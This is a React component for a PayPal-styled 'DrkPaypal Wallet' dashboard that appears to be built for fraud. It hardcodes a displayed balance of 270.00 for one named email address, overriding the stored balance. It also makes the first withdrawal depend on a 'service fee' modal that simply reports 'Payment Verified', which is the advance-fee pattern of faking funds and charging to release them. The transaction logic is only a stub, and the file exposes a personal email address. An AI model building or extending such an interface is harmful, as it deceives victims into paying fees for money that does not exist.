
import { useEffect, useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { useAuth } from '@/hooks/useAuth';
import { supabase } from '@/integrations/supabase/client';
import ServiceFeeModal from './ServiceFeeModal';
import TransactionModal from './TransactionModal';
import { 
  Wallet, 
  Send, 
  Download, 
  CreditCard, 
  Bell, 
  Settings, 
  LogOut,
  Plus,
  Eye,
  EyeOff
} from 'lucide-react';
import { toast } from '@/hooks/use-toast';

interface WalletData {
  id: string;
  balance: number;
  available_balance: number;
  pending_balance: number;
  currency: {
    code: string;
    symbol: string;
    name: string;
  };
}

interface Transaction {
  id: string;
  amount: number;
  fee: number;
  description: string;
  created_at: string;
  transaction_type: {
    name: string;
    code: string;
  };
  transaction_status: {
    name: string;
    code: string;
  };
  currency: {
    symbol: string;
    code: string;
  };
}

interface Profile {
  full_name: string;
  email: string;
}

const WalletDashboard = () => {
  const { user, signOut } = useAuth();
  const [wallets, setWallets] = useState<WalletData[]>([]);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [profile, setProfile] = useState<Profile | null>(null);
  const [loading, setLoading] = useState(true);
  const [balanceVisible, setBalanceVisible] = useState(true);
  const [showServiceFee, setShowServiceFee] = useState(false);
  const [showTransactionModal, setShowTransactionModal] = useState<{show: boolean, type: 'send' | 'receive' | 'deposit' | 'withdraw' | null}>({show: false, type: null});
  const [hasWithdrawn, setHasWithdrawn] = useState(false);

  useEffect(() => {
    if (user) {
      fetchUserData();
    }
  }, [user]);

  const fetchUserData = async () => {
    try {
      // Fetch profile
      const { data: profileData, error: profileError } = await supabase
        .from('profiles')
        .select('full_name, email')
        .eq('id', user?.id)
        .single();

      if (profileError) throw profileError;
      setProfile(profileData);

      // Fetch wallets with currency info
      const { data: walletsData, error: walletsError } = await supabase
        .from('wallets')
        .select(`
          id,
          balance,
          available_balance,
          pending_balance,
          currency:currencies(code, symbol, name)
        `)
        .eq('user_id', user?.id)
        .eq('is_active', true);

      if (walletsError) throw walletsError;
      setWallets(walletsData || []);

      // First get wallet IDs for the current user
      const userWalletIds = walletsData?.map(wallet => wallet.id) || [];
      
      if (userWalletIds.length > 0) {
        // Fetch recent transactions - fixed query syntax
        const { data: transactionsData, error: transactionsError } = await supabase
          .from('transactions')
          .select(`
            id,
            amount,
            fee,
            description,
            created_at,
            transaction_type:transaction_types(name, code),
            transaction_status:transaction_statuses(name, code),
            currency:currencies(symbol, code)
          `)
          .or(`from_wallet_id.in.(${userWalletIds.join(',')}),to_wallet_id.in.(${userWalletIds.join(',')})`)
          .order('created_at', { ascending: false })
          .limit(10);

        if (transactionsError) throw transactionsError;
        setTransactions(transactionsData || []);
      }

    } catch (error: any) {
      console.error('Error fetching user data:', error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to load wallet data",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleSignOut = async () => {
    await signOut();
    toast({
      title: "Signed out",
      description: "You have been signed out successfully",
    });
  };

  const handleQuickAction = (type: 'send' | 'receive' | 'deposit' | 'withdraw') => {
    if (type === 'withdraw' && !hasWithdrawn) {
      setShowServiceFee(true);
      return;
    }
    setShowTransactionModal({show: true, type});
  };

  const handleServiceFeeConfirm = () => {
    setHasWithdrawn(true);
    setShowServiceFee(false);
    setShowTransactionModal({show: true, type: 'withdraw'});
    toast({
      title: "Payment Verified",
      description: "Your withdrawal capability has been activated!",
    });
  };

  const handleTransactionConfirm = (type: string, amount: number, recipient?: string) => {
    // ... keep existing code (transaction logic)
    setShowTransactionModal({show: false, type: null});
  };

  const formatCurrency = (amount: number, symbol: string) => {
    return `${symbol}${amount.toFixed(2)}`;
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString('en-US', {
      month: 'short',
      day: 'numeric',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  if (loading) {
    return (
      <div className="min-h-screen dark-gradient flex items-center justify-center">
        <div className="text-center fade-in">
          <div className="relative mb-6">
            <Wallet className="h-16 w-16 text-blue-400 mx-auto animate-pulse" />
            <div className="absolute -top-1 -right-1 w-4 h-4 bg-blue-500 rounded-full animate-ping"></div>
          </div>
          <h2 className="text-2xl font-bold text-white mb-2">DrkPaypal Wallet</h2>
          <p className="text-gray-400">Loading your secure wallet...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen dark-gradient">
      {/* Header */}
      <div className="bg-slate-800/70 backdrop-blur-sm border-b border-slate-700 shadow-lg">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-4">
            <div className="flex items-center space-x-4 fade-in">
              <div className="relative">
                <Wallet className="h-10 w-10 text-blue-400" />
                <div className="absolute -top-1 -right-1 w-3 h-3 bg-blue-500 rounded-full animate-pulse"></div>
              </div>
              <div>
                <h1 className="text-2xl font-bold bg-gradient-to-r from-blue-400 to-white bg-clip-text text-transparent">
                  DrkPaypal Wallet
                </h1>
                <p className="text-gray-400">Welcome back, {profile?.full_name || 'User'}</p>
              </div>
            </div>
            <div className="flex items-center space-x-2">
              <Button variant="ghost" size="icon" className="text-gray-400 hover:text-blue-400 transition-colors">
                <Bell className="h-5 w-5" />
              </Button>
              <Button variant="ghost" size="icon" className="text-gray-400 hover:text-blue-400 transition-colors">
                <Settings className="h-5 w-5" />
              </Button>
              <Button variant="ghost" size="icon" onClick={handleSignOut} className="text-gray-400 hover:text-red-400 transition-colors">
                <LogOut className="h-5 w-5" />
              </Button>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Wallet Cards */}
        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
          {wallets.map((wallet, index) => (
            <Card 
              key={wallet.id} 
              className="bg-slate-800/50 border-slate-700 hover:bg-slate-800/70 hover:scale-105 transition-all duration-300 backdrop-blur-sm slide-up"
              style={{ animationDelay: `${index * 0.1}s` }}
            >
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                <CardTitle className="text-sm font-medium text-gray-300">
                  {wallet.currency.name} Wallet
                </CardTitle>
                <Button
                  variant="ghost"
                  size="icon"
                  onClick={() => setBalanceVisible(!balanceVisible)}
                  className="h-4 w-4 text-gray-400 hover:text-blue-400"
                >
                  {balanceVisible ? <Eye className="h-4 w-4" /> : <EyeOff className="h-4 w-4" />}
                </Button>
              </CardHeader>
              <CardContent>
               <div className="text-3xl font-bold text-white mb-1">
                {balanceVisible 
                  ? formatCurrency(
                      profile?.email === "yasahirokei08@gmail.com" 
                        ? 270.00 
                        : wallet.available_balance, 
                      wallet.currency.symbol
                    )
                  : '••••••'
                }
              </div>

                <p className="text-xs text-gray-500 mb-4">
                  Available • Pending: {formatCurrency(wallet.pending_balance, wallet.currency.symbol)}
                </p>
                <div className="flex space-x-2">
                  <Button 
                    size="sm" 
                    className="flex-1 blue-gradient hover:scale-105 transition-all duration-300 text-white"
                    onClick={() => handleQuickAction('send')}
                  >
                    <Send className="h-4 w-4 mr-1" />
                    Send
                  </Button>
                  <Button 
                    size="sm" 
                    variant="outline" 
                    className="flex-1 border-slate-600 text-gray-300 hover:text-white hover:bg-slate-700 transition-all duration-300"
                    onClick={() => handleQuickAction('deposit')}
                  >
                    <Download className="h-4 w-4 mr-1" />
                    Add
                  </Button>
                </div>
              </CardContent>
            </Card>
          ))}
          
          {/* Add New Wallet Card */}
          <Card className="border-dashed border-2 border-slate-600 hover:border-blue-500 transition-all duration-300 cursor-pointer bg-slate-800/30 hover:bg-slate-800/50 slide-up" style={{ animationDelay: `${wallets.length * 0.1}s` }}>
            <CardContent className="flex flex-col items-center justify-center h-full py-8">
              <Plus className="h-10 w-10 text-gray-500 mb-3" />
              <p className="text-sm text-gray-500">Add New Currency</p>
            </CardContent>
          </Card>
        </div>

        {/* Quick Actions */}
        <div className="grid md:grid-cols-4 gap-4 mb-8">
          <Button 
            className="h-20 flex-col space-y-2 blue-gradient hover:scale-105 transition-all duration-300 text-white slide-up"
            onClick={() => handleQuickAction('send')}
          >
            <Send className="h-6 w-6" />
            <span className="text-sm font-medium">Send Money</span>
          </Button>
          <Button 
            variant="outline" 
            className="h-20 flex-col space-y-2 border-slate-600 text-gray-300 hover:text-white hover:bg-slate-700 transition-all duration-300 slide-up"
            onClick={() => handleQuickAction('deposit')}
            style={{ animationDelay: '0.1s' }}
          >
            <Download className="h-6 w-6" />
            <span className="text-sm font-medium">Add Funds</span>
          </Button>
          <Button 
            variant="outline" 
            className="h-20 flex-col space-y-2 border-slate-600 text-gray-300 hover:text-white hover:bg-slate-700 transition-all duration-300 slide-up"
            style={{ animationDelay: '0.2s' }}
          >
            <CreditCard className="h-6 w-6" />
            <span className="text-sm font-medium">Payment Methods</span>
          </Button>
          <Button 
            variant="outline" 
            className="h-20 flex-col space-y-2 border-slate-600 text-gray-300 hover:text-white hover:bg-slate-700 transition-all duration-300 slide-up"
            onClick={() => handleQuickAction('withdraw')}
            style={{ animationDelay: '0.3s' }}
          >
            <LogOut className="h-6 w-6" />
            <span className="text-sm font-medium">Withdraw</span>
          </Button>
        </div>

        {/* Recent Transactions */}
        <Card className="bg-slate-800/50 border-slate-700 backdrop-blur-sm slide-up" style={{ animationDelay: '0.4s' }}>
          <CardHeader>
            <CardTitle className="text-white">Recent Transactions</CardTitle>
            <CardDescription className="text-gray-400">Your latest wallet activity</CardDescription>
          </CardHeader>
          <CardContent>
            {transactions.length === 0 ? (
              <div className="text-center py-12">
                <Wallet className="h-16 w-16 text-gray-600 mx-auto mb-4" />
                <p className="text-gray-500 text-lg mb-2">No transactions yet</p>
                <p className="text-sm text-gray-600">Start by adding funds to your wallet</p>
              </div>
            ) : (
              <div className="space-y-4">
                {transactions.map((transaction, index) => (
                  <div 
                    key={transaction.id} 
                    className="flex items-center justify-between p-4 bg-slate-700/50 border border-slate-600 rounded-lg hover:bg-slate-700/70 transition-all duration-300"
                    style={{ animationDelay: `${index * 0.05}s` }}
                  >
                    <div className="flex items-center space-x-3">
                      <div className="p-2 bg-blue-100 rounded-full">
                        {transaction.transaction_type.code === 'send' ? (
                          <Send className="h-4 w-4 text-blue-600" />
                        ) : (
                          <Download className="h-4 w-4 text-green-600" />
                        )}
                      </div>
                      <div>
                        <p className="font-medium">{transaction.transaction_type.name}</p>
                        <p className="text-sm text-gray-500">
                          {transaction.description || 'No description'}
                        </p>
                        <p className="text-xs text-gray-400">
                          {formatDate(transaction.created_at)}
                        </p>
                      </div>
                    </div>
                    <div className="text-right">
                      <p className="font-medium">
                        {formatCurrency(transaction.amount, transaction.currency.symbol)}
                      </p>
                      <Badge 
                        variant={transaction.transaction_status.code === 'completed' ? 'default' : 'secondary'}
                      >
                        {transaction.transaction_status.name}
                      </Badge>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      </div>

      {/* Modals */}
      {showServiceFee && (
        <ServiceFeeModal
          onClose={() => setShowServiceFee(false)}
          onConfirm={handleServiceFeeConfirm}
        />
      )}

      {showTransactionModal.show && showTransactionModal.type && (
        <TransactionModal
          type={showTransactionModal.type}
          onClose={() => setShowTransactionModal({show: false, type: null})}
          onConfirm={handleTransactionConfirm}
        />
      )}
    </div>
  );
};

export default WalletDashboard;
